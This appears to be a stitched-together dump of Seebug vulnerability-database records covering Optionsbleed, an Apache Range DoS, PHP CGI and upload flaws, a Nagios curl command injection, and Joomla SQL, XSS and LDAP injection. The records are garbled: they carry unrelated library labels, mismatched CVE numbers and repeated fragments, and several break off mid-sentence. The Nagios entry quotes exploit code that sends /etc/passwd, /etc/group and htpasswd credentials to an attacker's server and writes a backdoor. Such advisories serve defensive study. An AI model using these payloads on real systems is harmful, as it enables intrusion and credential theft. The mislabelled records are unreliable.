                      (Optionsbleed)","exploit","If you're using the HTTP protocol in everday Internet use you are usually only using two of its methods: GET and POST. However HTTP has a number of other methods, so I wondered what you can do with them and if there are any vulnerabilities.

One HTTP method is called OPTIONS. It simply allows asking a server which other HTTP methods it supports. The server answers with the ""Allow"" header and gives us a comma separated list of supported methods.

A scan of the Alexa Top 1 Million revealed something strange: Plenty of servers sent out an ""Allow"" header with what looked like corrupted data. Some examples:
```
Allow: ,GET,,,POST,OPTIONS,HEAD,,
Allow: POST,OPTIONS,,HEAD,:09:44 GMT
Allow: GET,HEAD,OPTIONS,,HEAD,,HEAD,,HEAD,, HEAD,,HEAD,,HEAD,,HEAD,POST,,HEAD,, HEAD,!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd""
Allow: GET,HEAD,OPTIONS,=write HTTP/1.0,HEAD,,HEAD,POST,,HEAD,TRACE
```
![](https://images.seebug.org/1505800657517)


That clearly looked interesting - and dangerous. It suspiciously looked like a ""bleed""-style bug, which has become a name for bugs where arbitrary pieces of memory are leaked to a potential attacker. However these were random servers on the Internet, so at first I didn't know what software was causing this.

Sometimes HTTP servers send a ""Server"" header telling the software. However one needs to be aware that the ""Server"" header can lie. It's quite common to have one HTTP server proxying another. I got all kinds of different ""Server"" headers back, but I very much suspected that these were all from the same bug.

I tried to contact the affected server operators, but only one of them answered, and he was extremely reluctant to tell me anything about his setup, so that wasn't very helpful either.

However I got one clue: Some of the corrupted headers contained strings that were clearly configuration options from Apache. It seemed quite unlikely that those would show up in the memory of other server software. But I was unable to reproduce anything alike on my own Apache servers. I also tried reading the code that put together the Allow header to see if I can find any clues, but with no success. So without knowing any details I contacted the Apache security team.

Fortunately Apache developer Jacob Champion digged into it and figured out what was going on: Apache supports a configuration directive Limit that allows restricting access to certain HTTP methods to a specific user. And if one sets the [Limit](https://httpd.apache.org/docs/2.4/mod/core.html#limit) directive in an .htaccess file for an HTTP method that's not globally registered in the server then the corruption happens. After that I was able to reproduce it myself. Setting a Limit directive for any invalid HTTP method in an .htaccess file caused a use after free error in the construction of the Allow header which was also [detectable with Address Sanitizer](https://blog.fuzzing-project.org/uploads/optionsbleed-asan.txt). (However ASAN doesn't work reliable due to the memory allocation abstraction done by APR.)

### FAQ

#### What's Optionsbleed?

Optionsbleed is a use after free error in Apache HTTP that causes a corrupted Allow header to be constructed in response to HTTP OPTIONS requests. This can leak pieces of arbitrary memory from the server process that may contain secrets. The memory pieces change after multiple requests, so for a vulnerable host an arbitrary number of memory chunks can be leaked.

The bug appears if a webmaster tries to use the ""Limit"" directive with an invalid HTTP method.

Example `.htaccess`:
```
<Limit abcxyz>
</Limit>
```

#### How prevalent is it?

Scanning the Alexa Top 1 Million revealed 466 hosts with corrupted Allow headers. In theory it's possible that other server software has similar bugs. On the other hand this bug is nondeterministic, so not all vulnerable hosts may have been catched.

#### So it only happens if you set a quite unusual configuration option?

There's an additional risk in shared hosting environments. The corruption is not limited to a single virtual host. One customer of a shared hosting provider could deliberately create an .htaccess file causing this corruption hoping to be able to extract secret data from other hosts on the same system.

#### I can't reproduce it!

Due to its nature the bug doesn't appear deterministically. It only seems to appear on busy servers. Sometimes it only appears after multiple requests.

#### Does it have a CVE?

[CVE-2017-9798](https://nvd.nist.gov/vuln/detail/CVE-2017-9798).

#### I'm seeing Allow headers containing HEAD multiple times!

This is actually a different Apache bug ([#61207](https://bz.apache.org/bugzilla/show_bug.cgi?id=61207)) that I found during this investigation. It causes HEAD to appear three times instead of once. However it's harmless and not a security bug.

Launchpad also has [a harmless bug that produces a malformed Allow header](https://bugs.launchpad.net/launchpad/+bug/1717682), using a space-separated list instead of a comma-separated one.

#### How can I test it?

A simple way is to use Curl in a loop and send OPTIONS requests:
```
for i in {1..100}; do curl -sI -X OPTIONS https://www.google.com/|grep -i ""allow:""; done
```
Depending on the server configuration it may not answer to OPTIONS requests on some URLs. Try different paths, HTTP versus HTTPS hosts, non-www versus www etc. may lead to different results.

Please note that this bug does not show up with the ""*"" OPTIONS target, you need a specific path.

Here's a [python proof of concept script](https://github.com/hannob/optionsbleed).

#### What shall I do?

If you run an Apache web server you should update. Most distributions should have updated packages by now or very soon. A patch can [be found here](https://svn.apache.org/viewvc/httpd/httpd/branches/2.4.x/server/core.c?r1=1805223&r2=1807754&pathrev=1807754&view=patch). A patch for Apache 2.2 is [available here](https://blog.fuzzing-project.org/uploads/apache-2.2-optionsbleed-backport.patch) (thanks to Thomas Deutschmann for backporting it).

Unfortunately the communication with the Apache security team wasn't ideal. They were unable to provide a timeline for a coordinated release with a fix, so I decided to define a disclosure date on my own without an upstream fix.

If you run an Apache web server in a shared hosting environment that allows users to create .htaccess files you should drop everything you do right now, update immediately and make sure you restart the server afterwards.

#### Is this as bad as Heartbleed?

No. Although similar in nature, this bug leaks only small chunks of memory and more importantly only affects a small number of hosts by default.

It's still a pretty bad bug, particularly for shared hosting environments.","SSV:96537","https://www.seebug.org/vuldb/ssvid-96537","seebug","5.0","AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:NONE/A:NONE/","https://vulners.com/seebug/SSV:96537"

"CVE-2011-3192","ml5.js, natural.js, ml.js, neuro.js, Apache MXNET","Apache HTTP Server畸形Range选项处理远程拒绝服务漏洞","exploit","BUGTRAQ  ID: 49303
CVE ID: CVE-2011-3192

Apache HTTP Server是Apache软件基金会的一个开放源代码的网页服务器，可以在大多数电脑操作系统中运行，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。

Apache HTTP Server在处理Range选项生成回应时存在漏洞，远程攻击者可能利用此漏洞通过发送恶意请求导致服务器失去响应，导致拒绝服务。

此漏洞源于Apache HTTP Server在处理Range头选项中包含的大量重叠范围指定命令时存在的问题，攻击者可通过发送到服务器的特制HTTTP请求耗尽系统资源，导致Apache失去响应，甚至造成操作系统资源耗尽。

Apache 2.x
Apache 1.3
临时解决方法：

在厂商提供官方补丁或新版本软件之前，建议用户采用如下的配置方案之一以尽可能免受漏洞的影响：

* 使用SetEnvIf配置命令来忽略畸形的Ranger选项，适用于Apache 2.0和2.2 。

    修改Apache的配置文件httpd.conf。
  
    去掉如下行的注释：
  
    LoadModule headers_module modules/mod_headers.so
  
    增加如下行的配置命令：

    SetEnvIf Range (,.*?){5,} bad-range=1
    RequestHeader unset Range env=bad-range

    重启Apache服务器。
  
* 安装启用mod_rewrite，设置规则过滤规则禁止带有畸形的Ranger选项的请求，适用于所有版本的
  Apache 。

    修改Apache的配置文件httpd.conf。
  
    去掉如下行的注释：
  
    LoadModule rewrite_module modules/mod_rewrite.so

    加入如下的mod_rewrite的规则配置行：
  
    RewriteEngine on
    RewriteCond %{HTTP:range} !(^bytes=[^,]+(,[^,]+){0,4}$|^$)
    RewriteRule .* - [F]
    
    重启Apache服务器。


上述两种配置会禁止Range选项包含超过5个范围指定命令的请求，在通常应用场景中对Web应用应该不会有什么影响，如果Web应用提供PDF数据或流媒体信息，可能需要调整阈值到更大的数值。

### Background

PHP is a widely used general-purpose scripting language that is especially suited for Web development. 

### Problem

When configured as a CGI script (aka php-cgi), PHP does not properly handle query string parameters which are passed directly to the php-cgi program. This can be exploited to execute arbitrary system commands or disclose the PHP source code. 

### Resolution

Upgrade PHP to version 5.4.3 or 5.3.13 or higher. 

### References

### Background

PHP is a widely used general-purpose scripting language that is especially suited for Web development. 

### Problem

When configured as a CGI script (aka php-cgi), PHP does not properly handle query string parameters which are passed directly to the php-cgi program. This can be exploited to execute arbitrary system commands or disclose the PHP source code. 

### Resolution

Upgrade PHP to version 5.4.3 or 5.3.13 or higher.

PHP处理参数的传递时存在漏洞，在特定的配置情况下，远程攻击者可能利用此漏洞在服务器上获取脚本源码或执行任意命令。

当PHP以特定的CGI方式被调用时（例如Apache的mod_cgid），php-cgi接收处理过的查询格式字符串作为命令行参数，允许命令行开关（例如-s、-d 或-c）传递到php-cgi程序，导致源代码泄露和任意代码执行。FastCGI不受影响。

PHP
临时解决方法：

使用RewriteRule来过滤请求：

RewriteRule规则如下

RewriteEngine on
RewriteCond %{QUERY_STRING} ^[^=]*$
RewriteCond %{QUERY_STRING} %2d|\- [NC]
RewriteRule .? - [F,L]

PHP在12月为哈希碰撞拒绝服务(CVE-2011-4885)(http://sebug.net/vuldb/ssvid-30001)提供的补丁引出了另一个严重的安全漏洞。

防止哈希碰撞的补丁在php.ini中引入了新的配置属性：
max_input_vars

此配置元素限制用于请求中使用的变量数量(如http://request.com/foo.php?a=1&amp;b=2&amp;c=3)，默认设置为1000。

漏洞修补在php_variables.c代码中的php_register_variable_ex函数中作了更改，不过当变量数超过max_input_vars，而变量又是数组变量时(if (*p == ‘['))可触发此漏洞。漏洞可导致任意代码执行。

PHP是广泛使用的通用目的脚本语言，特别适合于Web开发，可嵌入到HTML中。

ZipArchive库允许透明的读写ZIP压缩档案及其之中的文件。对于PHP中所使用的ZipArchive::getArchiveComment函数：

- ---
1945     static ZIPARCHIVE_METHOD(getArchiveComment)
1946     {
1947     struct zip *intern;
1948     zval *this = getThis();
1949     long flags = 0;
1950     const char * comment;
1951     int comment_len = 0;
1952     
1953     if (!this) {
1954     RETURN_FALSE;
1955     }
1956     
1957     ZIP_FROM_OBJECT(intern, this);
1958     
1959     if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, &quot;|l&quot;, &amp;flags)
== FAILURE) {
1960     return;
1961     }
1962     
1963     comment = zip_get_archive_comment(intern, &amp;comment_len,
(int)flags); &lt;==== RETURN NULL AND -1
1964     RETURN_STRINGL((char *)comment, (long)comment_len, 1); &lt;===== NULL
POINTER DEFERENCE HERE
1965     }
- ---

这种方式从zip_get_archive_comment()函数返回字符串。而在这个函数中：

- ---
40     ZIP_EXTERN(const char *)
41     zip_get_archive_comment(struct zip *za, int *lenp, int flags)
42     {
43     if ((flags &amp; ZIP_FL_UNCHANGED)
44     || (za-&gt;ch_comment_len == -1)) {
45     if (za-&gt;cdir) {
46     if (lenp != NULL)
47     *lenp = za-&gt;cdir-&gt;comment_len;
48     return za-&gt;cdir-&gt;comment;
49     }
50     else {
51     if (lenp != NULL)
52     *lenp = -1; &lt;===================== -1
53     return NULL; &lt;==================== NULL
54     }
55     }
56     
57     if (lenp != NULL)
58     *lenp = za-&gt;ch_comment_len;
59     return za-&gt;ch_comment;
60     }
- ---

52和53行应返回空指针和(int)-1。在结果中会以以下方式执行RETURN_STRINGL()：

RETURN_STRINGL(NULL, -1, 1);

memcpy(3)中会出现崩溃。

CVE ID: CVE-2011-1148

PHP是广泛使用的通用目的脚本语言，特别适合于Web开发，可嵌入到HTML中。

PHP的&quot;substr_replace()&quot;函数在实现上存在释放后重用远程内存破坏漏洞，远程攻击者可利用此漏洞在网络服务器中执行任意代码，造成拒绝服务。

此漏洞源于在将同一个变量多次发送到&quot;substr_replace()&quot;函数时，PHP会使该函数中的三个变量使用同一个指针，所以当函数中的类型转换更改了该指针，该指针也会使其他变量无效。

"CVE-2010-0425","ml5.js, natural.js, ml.js, neuro.js","Apache mod_isapi Dangling Pointer","exploit","This module triggers a use-after-free vulnerability in the Apache Software Foundation mod_isapi extension for versions 2.2.14 and earlier. In order to reach the vulnerable code, the target server must have an ISAPI module installed and configured. By making a request that terminates abnormally (either an aborted TCP connection or an unsatisfied chunked request), mod_isapi will unload the ISAPI extension. Later, if another request comes for that ISAPI module, previously obtained pointers will be used resulting in an access violation or potentially arbitrary code execution. Although arbitrary code execution is theoretically possible, a real-world method of invoking this consequence has not been proven. In order to do so, one would need to find a situation where a particular ISAPI module loads at an image base address that can be re-allocated by a remote attacker. Limited success was encountered using two separate ISAPI modules. In this scenario, a second ISAPI module was loaded into the same memory area as the previously unloaded module.

Apache HTTP Server包含的mod_proxy_balancer模块存在输入验证问题，远程攻击者可以利用漏洞进行跨站脚本，CSRF，拒绝服务等攻击。
1，由于所有行为通过GET访问执行，存在“CSRF”攻击。
2，&quot;mod_proxy_balancer.c&quot;存在跨站脚本问题，输入传递给：
&quot;ss&quot; - 为&quot;&quot;StickySession Identifier&quot;,
&quot;wr&quot; - 为&quot;Route&quot;,
&quot;rr&quot; - 为&quot;Route Redirect&quot;，
参数没有进行任何过滤可导致任意HTML和脚本代码执行。
另外对&quot;balancer-mamanger&quot;参数缺少过滤，也可导致任意HTML和脚本代码执行。
3，管理负责loadfactors和member状态的&quot;balancer_handler()&quot;存在错误，当编辑工作设置使攻击者输入非法&quot;b&quot;变量可导致拒绝服务攻击。
4，当在URL中输入7390 or 7506或7622 &quot;A&quot;字符时会由于&quot;mod_proxy_balancer&quot;错误而导致内存破坏。

### 漏洞详情

该漏洞存在于php的move_uploaded_file()函数中，这个函数一般在上传文件时被使用，用途是将上传的文件移动到新位置。

```
move_uploaded_file ( string $filename , string $destination )
```

这次的漏洞就出现在$destination这个参数中，这个参数代表的是上传文件移动的最终目的地址。如果$destination变量是从用户$_GET或$_POST中获得的并且我们可控，那么我们可以利用空字符\x00来截断后面的拓展名，从而造成任意文件上传。

### 漏洞利用演示

我们利用DVWA的high难度来演示，首先我们把move_uploaded_file()函数的第二个参数改成我们可控的$_POST['xxname']。

```
<?php
if (isset($_POST['Upload'])) {
$target_path = DVWA_WEB_PAGE_TO_ROOT.""hackable/uploads/"";
$target_path = $target_path . basename($_FILES['uploaded']['name']);
$uploaded_name = $_FILES['uploaded']['name'];
$uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, '.') + 1);
$uploaded_size = $_FILES['uploaded']['size'];
if (($uploaded_ext == ""jpg"" || $uploaded_ext == ""JPG"" || $uploaded_ext == ""jpeg"" || $uploaded_ext == ""JPEG"") && ($uploaded_size < 100000)){
if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $_POST['xxname'])) {
$html .= '<pre>';
$html .= 'Your image was not uploaded.';
$html .= '</pre>';
      } else {
$html .= '<pre>';
$html .= $target_path . ' succesfully uploaded!';
$html .= '</pre>';
}
}
else{
$html .= '<pre>';
$html .= 'Your image was not uploaded.';
$html .= '</pre>';
}
}
?>
```

然后上传文件，这里把POST的xxname参数利用空字符进行截断。

如下图所示：

"CVE-2015-4642","ml.js, clusterfck.js","Nagios Core < 4.2.2 Curl Command Injection/Code Execution （CVE-2016-9565）","exploit","**Author: p0wd3r, dawu (know Chong Yu 404 security lab)**

**Date: 2016-12-15**

## 0x00 vulnerability overview

### 1\. Vulnerability description

[Nagios ](<https://www.nagios.org>) is a monitoring of the IT infrastructure program, recently security researchers [Dawid Golunski ](<http://legalhackers.com/>) discovered in [Nagios Core ](<https://www.nagios.org/projects/nagios-core/>) there is a code execution vulnerability: an attacker first in the disguise of RSS feeds, when victimization the app to get the RSS information when the attacker would construct a malicious data to the victim, the program in the process will be the malicious data is injected into the curl command, and then code execution.

### 2\. Vulnerability

The vulnerability is triggered premise:

  1. The attacker can be disguised as `https://www.nagios.org `using dns spoofing and other methods
  2. The attacker is authorized, or an attacker convinces an authorized user to access `rss-corefeed.php `and `rss-newsfeed.php `and `rss-corebanner.php `one of the files.

A successful attack execute arbitrary code.

### 3\. Impact version

Nagios Core &lt; 4.2.2

## 0x01 vulnerability reproduction

### 1\. Environment to build

Dockerfile:

``dockerfile FROM quantumobject/docker-nagios

RUN sed-i '99d' /usr/local/nagios/share/includes/rss/rss_fetch. inc

RUN mkdir /tmp/tmp &amp;&amp; chown www-data:www-data /tmp/tmp ``

Then run:

`bash docker run-p 80:80 --name nagios-d quantumobject/docker-nagios`

Access `http://127.0.0.1/nagios `with `nagiosadmin:admin `log in

### 2\. Vulnerability analysis

Vulnerability trigger point in`/usr/local/nagios/share/includes/rss/extlib/Snoopy. class. inc `the 657 line, the`_httpsrequest `function:

``php // version &lt; 4.2.0 exec($this-&gt;curl_path."" -D \""/tmp/$headerfile\"""". escapeshellcmd($cmdline_params)."" "". escapeshellcmd($URI),$results,$return);

// vserion &gt;= 4.2.0 &amp;&amp; version &lt; 4.2.2 exec($this-&gt;curl_path."" -D \""/tmp/$headerfile\"""".$ cmdline_params."" \"""". escapeshellcmd($URI).""\"""",$ results,$return); ``

Where the use of the `escapeshellcmd `to the **command parameter **processing, `escapeshellcmd `of the role are as follows:

![Alt text](https://images.seebug.org/content/images/2016/12/escapeshellcmd.png)

The author is intended to prevent multiple execution of the command, but this treatment did not prevent the implantation **of a plurality of parameter **samples if the`$URI `controlled, and then with the `curl `of some characteristics can read and write files, and then code execution. （In General to prevent the injection of a plurality of parameters you want to use [escapeshellarg](<http://php.net/manual/zh/function.escapeshellarg.php>), but the function is not absolute security, as detailed in [CVE-2015-4642 ](<https://bugs.php.net/bug.php?id=69646>)it.

Because before the burst of the [CVE-2008-4796](<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4796>), the code in the 4. 2. 0 version did change, but the patch can be bypassed, as long as we are in the input closed before and after`""`.

Below we look at`$URI `whether controllable. According to the code logic point of view,`_httpsrequet `is `usr/local/nagios/share/includes/rss/rss_fetch. inc `in the `fetch_rss `function call, so that we create such a test file `test.php `to:

``php &lt;? php define('MAGPIE_DIR', './ includes/rss/'); define('MAGPIE_CACHE_ON', 0); define('MAGPIE_CACHE_AGE', 0); define('MAGPIE_CACHE_DIR', '/tmp/magpie_cache'); require_once(MAGPIE_DIR.'rss_fetch. inc');

fetch_rss('https://www.baidu.com --version'); ``

Access `http://127.0.0.1/nagios/test.php `after turn on dynamic debugging, we in the `exec `function at the lower breakpoint, the call stack is as follows:

![Alt text](https://images.seebug.org/content/images/2016/12/req-call.png)

`$URI `as follows:

![Alt text](https://images.seebug.org/content/images/2016/12/uri-control.png)

Shows the`$URI `controlled, and in the incoming process has not been filtered.

Next we need to construct `the curl `parameters to get the results we want, here we use Dawid Golunski provide the [Exp](<https://github.com/0xwindows/VulScritp/blob/master/nagios/nagios_cmd_injection.py>), it is noted that he provided the code to verify that 4. 2. 0 before version to verify the version greater than or equal to 4. 2. 0 and less than 4. 2. 2, The need for which code is about to change, coupled with the closure needed to double the quotes:

``python

# Line 44

self. redirect('https://' + self. request. host + '/nagioshack"" -Fpasswd=@/etc/passwd-Fgroup=@/etc/group-Fhtauth=@/usr/local/nagios/etc/htpasswd.users --trace-ascii ' + backdoor_path + '""', permanent=False) `` 

The Exp of the specific process is as follows:

  1. The attacker on the server to open a http/https Server
  2. Victims using `fetch_rss `to the server to send its request
  3. The attacker receives the request to redirect, redirect url to `https:// + the attacker's server + payload`, the payload in the use`-F `the file content is sent to the server, the`--trace-ascii `will flow records to the file, similar to Roundcube RCE in the `mail `function of`-X `is.
  4. The server receives the redirected request after the following three operations:
    1. Parse the file content
    2. Return to the back door content and then through the flow record is written to the backdoor file
    3. Returns the constructed XML in the `description`, add`<img src=backdoor.php>`
  5. Victims parse the XML and the `description `of the contents of the output to html, and then automatically performs back door

In order to facilitate verification, we are in the website directory create a `exp.php`:

``php &lt;? php define('MAGPIE_DIR', './ includes/rss/'); define('MAGPIE_CACHE_ON', 0); define('MAGPIE_CACHE_AGE', 0); define('MAGPIE_CACHE_DIR', '/tmp/magpie_cache'); require_once(MAGPIE_DIR.'rss_fetch. inc');

fetch_rss('http://172.17.0.3'); ``

Only for validation vulnerability, where we don't have to parse the XML and then we `172.17.0.3 `run on Exp, and then access the `http://127.0.0.1/exp.php `you can get the results:

![Alt text](https://images.seebug.org/content/images/2016/12/exp.png)

The actual testing Exp in back door code is possible in the log will be truncated resulting in command execution is unsuccessful, recommended to write a brief word:

The real case, the `fetch_rss `call as follows:

Visible we can not control the values of the parameters, it can only be by dns spoofing and other means to make the target of the `https://www.nagios.org `the access point to the attacker's server, and then trigger the vulnerability.

#### CVE-2018-8045 漏洞简介
漏洞具体情况可参见[绿盟科技安全威胁周报-201812周](http://blog.nsfocus.net/nsfocus-201812/ ""绿盟科技安全威胁周报-201812周"")

Joomla! Core SQL注入漏洞：

NSFOCUS ID：39158  
CVE ID：CVE-2018-8045  
受影响版本：Joomla! Joomla! 3.5.0-3.8.5  
漏洞点评：Joomla是一套网站内容管理系统,使用PHP语言和MySQL数据库开发。Joomla! 3.5.0 -3.8.5版本对SQL语句内的变量缺少类型转换，导致User Notes列表视图内SQL注 入漏洞，可使攻击者访问或修改数据等。目前厂商已经发布了升级补丁，修复了这个 安全问题，请用户及时到厂商的主页下载。

#### CVE-2018-8045 漏洞详情
我们先看下joomla官网怎么说的：

<https://developer.joomla.org/security-centre/723-20180301-core-sqli-vulnerability.html></https://developer.joomla.org/security-centre/723-20180301-core-sqli-vulnerability.html>

![](https://images.seebug.org/content/images/2018/03/dae57f06-19fe-431d-978f-57ce06d53251.png-w331s)

User Notes模块由于缺少变量类型转换，导致sql注入的产生。这个漏洞在3.8.6版本被解决。

漏洞介绍很模糊，单从介绍来看，根本不知道这个sql注入产生的位置。

但是既然是3.8.6版本解决的，那我们就来从3.8.6版本的update包中找找思路。

如下是github上joomla的releases列表

<https://github.com/joomla/joomla-cms/releases>

找到Update from Joomla! 3.8.5升级包下载，打开下载好的升级包，根据notes这个线索搜索下。果然，在升级包中看到了一个notes.php文件。

![](https://images.seebug.org/content/images/2018/03/93080ab4-81c8-4395-a3ed-9dcfb6e50a2d.png-w331s)

我们回到github上，看下这个notes.php改动了什么。

![](https://images.seebug.org/content/images/2018/03/899478ec-c31e-4266-bc0d-05c644802b22.png-w331s)

很明显，升级包中的notes.php中，对$categoryId的值进行了限制，强制转换为int类型，可以确定，这个漏洞就出在这里。

在这里说个题外话，notes.php中getState方法出现过很多次，分别有

- getState(‘filter.search’)
- getState(‘filter.published’)
- getState(‘filter.category_id’)
- getState(‘filter.user_id’)
- getState(‘filter.level’)

但是唯有getState(‘filter.category_id’)方法没有进行(int)类型转换，存在着漏洞隐患，这可能是开发者一时的疏忽吧。

#### CVE-2018-8045 漏洞分析
来看下存在漏洞的代码：
```
// Filter by a single or group of categories.
$categoryId = $this->getState('filter.category_id');

if ($categoryId && is_scalar($categoryId))
{
   $query->where('a.catid = ' . $categoryId);
}
```

$categoryId未经过滤直接拼接sql语句进行查询，造成了sql注入。

但是$categoryId参数如何控制呢？

存在漏洞的文件位于\administrator\components\com_users\models\notes.php，是一个joomla的模型文件，它的控制器是\administrator\components\com_users\controllers\notes.php

我们登录joomla后台来看一下在哪里触发这个漏洞。

访问<http://xxx/joomla/administrator/index.php?option=com_users&view=notes></http://xxx/joomla/administrator/index.php?option> 即可触发该控制器。

![](https://images.seebug.org/content/images/2018/03/ff2f1711-1b5f-4d69-8938-c4c2e1bfc2e5.png-w331s)

但是如何控制$categoryId参数呢？如果只访问

<http://xxx/joomla/administrator/index.php?option=com_users&view=notes></http://xxx/joomla/administrator/index.php?option>

只会向服务器发送一个get请求，请求中根本不包含我们想要的categoryId参数

先看下出问题的这行代码

```
$categoryId = $this->getState('filter.category_id');
```

从getState(‘filter.category_id’)不难看出来，它的作用是一个过滤器，用来选择category_id的

因此想向它传参，一定和高级搜索之类功能的有关。

选择Search Tools选项 Select Category选项。

![](https://images.seebug.org/content/images/2018/03/05c064f2-bc6e-4060-91f3-de00df968eeb.png-w331s)

此时joomla的发包情况

![](https://images.seebug.org/content/images/2018/03/a889a9ed-c53c-46cd-8fcc-2260ceba6b88.png-w331s)

此时我们需要的filter[category_id]参数出现在了post参数中，通过这个参数的值，即可畅通无阻的进行注入。

下面验证下这个filter[category_id]参部分可以直接传递给后台的$categoryId参数

我们修改了filter[category_id]参数内容为’kingsguard_test’，并发包

![](https://images.seebug.org/content/images/2018/03/f638fb3d-b36a-4968-9fd3-a9ecea2cfc1c.png-w331s)

后台下断点，抓取$categoryId值，可见’kingsguard_test’原封不动的被传递给$categoryId参数，并拼接sql语句进行查询。

![](https://images.seebug.org/content/images/2018/03/eb22e94c-c672-4741-9f28-f82c513c3b0b.png-w331s)

#### 利用验证

"CVE-2017-7986","brain.js","Joomla! Core XSS Vulnerability(CVE-2017-7985)","exploit","Joomla! is one of the world's most popular content management system (CMS) solutions. It enables users to build custom Web sites and powerful online applications. More than 3 percent of Web sites are running Joomla!, and it accounts for more than 9 percent of CMS market share.

As of November 2016, Joomla! had been downloaded over 78 million times. Over 7,800 free and commercial extensions are also currently available from the official Joomla! Extension Directory, and more are available from other sources.

This year, as a FortiGuard researcher I discovered and reported two Cross-Site Scripting (XSS) vulnerabilities in Joomla!. They are identified as CVE-2017-7985 and CVE-2017-7986. Joomla! patched them  this week. These vulnerabilities affect Joomla! versions 1.5.0 through 3.6.5. They exist because these versions of Joomla! fail to sanitize malicious user input when users post or edit an article. Remote attacker could exploit them to run malicious code in victims’ browser, potentially allowing the attacker to gain control of the victim’s Joomla! account. If the victim has higher permission, like system administrator, the remote attacker could gain full control of the web server.

In this blog, I will share the details of these vulnerabilities.

### Background
Joomla! has its own XSS filters. For example, a user with post permission is not allowed to use full HTML elements. When this user posts an article with HTML attributes, Joomla! will sterilize dangerous code like “javascript:alert()”, “background:url()” and so on. Joomla! has two ways to achieve this sterilization. On the client side, it uses the editor called “TinyMCE.” On the server side, it sanitizes the request before storing it on the server.

### Analysis
To demonstrate these vulnerabilities, the test account ‘yzy1’ is created. It has author permission, which is not allowed to use full HTML elements.

To bypass the client side sterilization, the attacker can use a network intercept tool like Burp Suite or just change the default editor to other Joomla! built-in editors, like CoodeMirror or None, as shown in Figure 1.


![Figure1](https://d3gpjj9d20n0p3.cloudfront.net/ngblog/uploads/files/JoomlaCoreXSS001.png)
Figure 1. Bypassing the client side XSS filter

On the server side, I found two ways to bypass the XSS filters. They are identified as CVE-2017-7985 and CVE-2017-7986.

### CVE-2017-7985
The Joomla! server side XSS filter sterilizes dangerous code and saves the safe characters. For example, when we post the following code with the test account,  Joomla! sterilizes it by double quoting the , deleting the , and adding safe links to the URLs, as shown in Figure 2.


![Figure2](https://d3gpjj9d20n0p3.cloudfront.net/ngblog/uploads/files/JoomlaCoreXSS003.png)
Figure 2. Joomla! XSS filter

But an attacker could take advantage of the filter by trying to let the filter to reconstruct the code and rebuild the scripts. For example, we can add the code Note that the double quote in  is the CORRECT DOUBLE QUOTATION MARK, as shown in Figure 3.

### Solution
All users of Joomla! should upgrade to the latest version immediately. Additionally, organizations that have deployed Fortinet IPS solutions are already protected from these vulnerabilities with the signatures Joomla!.Core.Article.Post.Colon.Char.XSS and Joomla!.Core.Article.Post.Quote.Char.XSS.","SSV:93081","https://www.seebug.org/vuldb/ssvid-93081","seebug","4.3","AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:PARTIAL/A:NONE/","https://vulners.com/seebug/SSV:93081"

Exploit
Here I provide an exploit example for CVE-2017-7986 that allows an attacker with a low permission account to create a Super User account and upload a web shell. To achieve this, I will write a small piece of JavaScript code for creating a Super User account by using the site administrator’s permission. It first obtains the CSRF token from the user edit page , and then posts the Super User account creation request to the server with the stolen CSRF token. The new Super User will be ‘Fortinet Yzy’ with the password ‘test’.

"CVE-2017-14596","brain.js","Joomla! 3.7.5  LDAP injection vulnerability(CVE-2017-14596)","exploit","## Joomla! 3.7.5 - Takeover in 20 Seconds with LDAP Injection

With over 84 million downloads, Joomla! is one of the most popular content management systems in the World Wide Web. It powers about 3.3% of all websites’ content and articles. Our code analysis solution RIPS detected a previously unknown LDAP injection vulnerability in the login controller. This one vulnerability could allow remote attackers to leak the super user password with blind injection techniques and to fully take over any Joomla! &lt;= 3.7.5 installation within seconds that uses LDAP for authentication. Joomla! has fixed the vulnerability in the latest version 3.8.

### Requirements - Who is affected

Installations with the following requirements are affected by this vulnerability:

  * Joomla! version 1.5 &lt;= 3.7.5 is installed
  * Joomla! is configured to use LDAP for authentication

This is not a configuration flaw, and an attacker does not need any privileges to exploit this vulnerability.

### Impact - What can an attacker do

By exploiting a vulnerability in the login page, an unprivileged remote attacker can efficiently extract all authentication credentials of the LDAP server that is used by the Joomla! installation. These include the username and password of the super user, the Joomla! administrator. An attacker can then use the hijacked information to login to the administrator control panel and to take over the Joomla! installation, as well as potentially the web server, by uploading custom Joomla! extensions for remote code execution.

### Vulnerability Analysis - CVE-2017-14596

Our code analysis solution RIPS automatically identified the vulnerability that spans over the following nested code lines. First, in the `LoginController ` the Joomla! the application receives the user-supplied credentials from the login form.

`/administrator/components/com_login/controller.php` `class LoginController extends JControllerLegacy { public function login() { ⋮ $app = JFactory::getApplication(); ⋮ $model = $this->getModel('login'); $credentials = $model->getState('credentials'); ⋮ $app->login($credentials, array('action' => 'core. login. admin')); } }`

The credentials are passed on to the `login ` method which then invokes the `authenticate ` method.

`/libraries/cms/application/cms.php` `class JApplicationCms extends JApplicationWeb { public function login($credentials, $options = array()) { ⋮ $authenticate = JAuthentication::getInstance(); $authenticate->authenticate($credentials, $options); } }`

`/libraries/joomla/authentication/authentication.php` `class JAuthentication extends JObject { public function authenticate($credentials, $options = array()) { ⋮ $plugin->onUserAuthenticate($credentials, $options, $response); } }`

Based on the plugin that is used for authentication, the `authenticate ` method passes the credentials to the `onUserAuthenticate ` method. If Joomla! is configured to use LDAP for authentication, the LDAP plugin's method is invoked.

`/plugins/authentication/ldap/ldap.php` `class PlgAuthenticationLdap extends JPlugin { public function onUserAuthenticate($credentials, $options, &$response) { ⋮ $userdetails = $ldap->simple_search( str_replace( '[search]', $credentials['username'], $this->params->get('search_string') ) ); } }`

In the LDAP plugin, the `username ` credential is embedded into the LDAP query specified in the `search_string ` option. According to the official [Joomla! documentation](<https://docs.joomla.org/LDAP_Authentication>), the `search_string ` configuration option is “a query string used to search for the user, where [search] is directly replaced by the search text from the login field”, for example “uid=[search]“. The LDAP query is then passed to the `simple_search ` method of the `LdapClient ` which connects to the LDAP server and performs the `ldap_search`.

